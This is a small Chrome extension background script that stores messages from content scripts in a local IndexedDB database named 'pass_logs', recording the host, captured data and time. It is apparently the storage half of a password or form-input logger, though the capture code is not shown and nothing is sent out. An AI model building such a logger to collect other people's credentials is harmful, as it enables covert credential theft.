window.indexedDB = window.indexedDB || window.webkitIndexedDB;
window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction;
window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange;

var db_req = window.indexedDB.open("pass_logs", 1);

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse){
	var trans=window.db_req.result.transaction(["logs"], 'readwrite'),
		store=trans.objectStore("logs");
	if(request.action=="save_data"){
		store.add({host:request.host,data:request.data,time:(new Date()).toJSON()});
	}
	var all=store.getAll();
	sendResponse({});
});

chrome.runtime.onInstalled.addListener(function(){
	window.db_req.onupgradeneeded = function(e){
		var db = e.target.result;
		var store = db.createObjectStore("logs", {keyPath: "id",autoIncrement:true});
		
		store.createIndex("host","host");
		store.createIndex("inputs","inputs");
		store.createIndex("time","time");
	}
});